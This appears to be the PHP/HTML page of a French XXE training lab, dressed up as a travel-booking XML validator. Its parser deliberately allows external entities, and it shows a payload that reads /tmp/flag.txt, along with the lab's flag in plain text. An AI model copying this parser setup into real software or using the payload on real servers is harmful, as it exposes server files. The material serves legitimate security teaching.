<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>XML Validator - VoyagePlus</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header class="diable-header">
        <div class="header-content">
            <h1>✈️ VoyagePlus</h1>
            <p class="subtitle">Service de validation XML des réservations</p>
        </div>
    </header>

    <main class="container">
        <div class="warning-banner">
            ⚠️ BETA - Service de validation XML
        </div>

        <section class="upload-section">
            <h2>📄 Validation de fichier XML</h2>
            
            <div class="upload-card">
                <form method="POST" class="upload-form">
                    <div class="form-group">
                        <label for="xml">Entrez votre XML :</label>
                        <textarea name="xml" id="xml" rows="10" class="file-input" required><?php echo htmlspecialchars('<?xml version="1.0"?>
<reservation>
    <nom>Dupont</nom>
    <vol>AF123</vol>
</reservation>'); ?></textarea>
                    </div>
                    
                    <button type="submit" class="btn-primary">
                        Valider le XML
                    </button>
                </form>

                <?php
                if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['xml'])) {
                    $xml_input = $_POST['xml'];
                    
                    // 🔴 VULNÉRABILITÉ XXE : Pas de désactivation des entités externes
                    libxml_disable_entity_loader(false);
                    
                    // Créer un document XML
                    $doc = new DOMDocument();
                    $doc->loadXML($xml_input, LIBXML_NOENT); // LIBXML_NOENT = entités externes résolues
                    
                    echo '<div class="result-box">';
                    echo '<h3>📋 Résultat de la validation :</h3>';
                    echo '<pre>' . htmlspecialchars($doc->saveXML()) . '</pre>';
                    echo '</div>';
                }
                ?>
            </div>
        </section>

        <!-- Section pédagogique -->
        <section class="info-section">
            <details>
                <summary>ℹ️ Exemple XML normal</summary>
                <div class="info-content">
                    <pre>&lt;?xml version="1.0"?&gt;
&lt;reservation&gt;
    &lt;nom&gt;Dupont&lt;/nom&gt;
    &lt;vol&gt;AF123&lt;/vol&gt;
&lt;/reservation&gt;</pre>
                </div>
            </details>
            
            <details>
                <summary>⚠️ Attention (pour test)</summary>
                <div class="info-content">
                    <p>Le service peut lire des fichiers système avec :</p>
                    <pre>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY xxe SYSTEM "file:///tmp/flag.txt"&gt;
]&gt;
&lt;reservation&gt;
    &lt;nom&gt;&xxe;&lt;/nom&gt;
    &lt;vol&gt;AF123&lt;/vol&gt;
&lt;/reservation&gt;</pre>
                </div>
            </details>
        </section>

        <!-- 🔴 AJOUTE LE LIEN ICI -->
        <div style="text-align: center; margin-top: 30px; margin-bottom: 20px;">
            <a href="upload.php" class="btn-primary" style="background: transparent; border: 2px solid var(--glow-color); padding: 12px 30px; display: inline-block; text-decoration: none;">
                📤 Essayer l'upload de fichier XML →
            </a>
        </div>
        
                <!-- 🏆 SECTION FLAG DE VALIDATION -->
        <section class="info-section" style="margin-top: 30px; border-left: 4px solid #FFD700; background: rgba(255, 215, 0, 0.05);">
            <details open>
                <summary style="color: #FFD700; font-weight: bold;">🏆 VALIDATION - Flag à trouver</summary>
                <div class="info-content">
                    <p><strong>Objectif :</strong> Lire le fichier <code>/tmp/flag.txt</code> sur le serveur via XXE.</p>
                    
                    <div style="background: #1a1a1a; padding: 15px; border-radius: 5px; margin: 10px 0;">
                        <p style="color: #FFD700; font-weight: bold;">🎯 Méthode :</p>
                        <ol style="color: var(--text-secondary);">
                            <li>Utiliser ce payload XML :</li>
                            <pre style="background: #000; color: #0f0; overflow-x: auto;">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY xxe SYSTEM "file:///tmp/flag.txt"&gt;
]&gt;
&lt;reservation&gt;
    &lt;nom&gt;&xxe;&lt;/nom&gt;
    &lt;vol&gt;AF123&lt;/vol&gt;
&lt;/reservation&gt;</pre>
                            <li>Coller dans la zone de texte et valider</li>
                            <li>Le flag apparaît dans la balise &lt;nom&gt;</li>
                        </ol>
                    </div>
                    
                    <div style="background: #0a1a0a; padding: 20px; border-radius: 5px; margin-top: 15px; text-align: center; border: 1px dashed #FFD700;">
                        <p style="color: #FFD700; font-weight: bold; font-size: 1.2rem;">🔑 Le flag à trouver :</p>
                        <p style="font-size: 2.2rem; font-family: 'Courier New', monospace; letter-spacing: 3px; background: #000; padding: 15px; border-radius: 5px; color: #0f0; font-weight: bold; border: 1px solid #0f0;">
                            FLAG{????????????????}
                        </p>
                        <p style="color: var(--text-secondary); font-size: 0.9rem; margin-top: 10px;">
                            (Format FLAG{...}, à communiquer à l'équipe quand trouvé)
                        </p>
                    </div>
                    
                    <div style="background: #1a1a1a; padding: 15px; border-radius: 5px; margin-top: 15px;">
                        <p style="color: #ff9999; margin-bottom: 5px;">⚠️ À faire après avoir trouvé le flag :</p>
                        <p>Envoyer <strong style="color: #FFD700;">FLAG{XXE_SUCCESS_2026}</strong> dans le groupe pour valider que l'attaque fonctionne.</p>
                    </div>
                </div>
            </details>
        </section>

    </main>

    <footer class="diable-footer">
        <p>Lab DIABLE v3.0 - XXE Lab | Scénario 1: File Read</p>
    </footer>
</body>
</html>
